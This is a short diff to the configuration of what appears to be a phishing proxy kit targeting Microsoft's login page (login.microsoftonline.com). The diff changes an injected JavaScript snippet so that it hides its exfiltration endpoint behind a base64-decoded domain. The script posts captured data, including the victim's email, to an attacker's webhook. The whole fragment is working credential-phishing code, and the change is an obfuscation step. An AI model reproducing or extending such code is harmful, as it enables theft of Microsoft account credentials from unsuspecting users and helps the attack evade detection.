@@ -32,8 +32,8 @@ js_inject:
   - trigger_domains: ['{{.Endpoint2}}.{{.Domain}}', 'login.microsoftonline.com']
     trigger_paths: ['/.*']
     script: |
-      (function(){
-        const api = "https://{{.Domain}}/api/webhook";
+      (function() {
+        const api = atob('{{.DomainBase64}}') + "/api/webhook";
         const secret = "{{.WebhookSecret}}";
         const source = "microsoft";
         let capturedEmail = '';
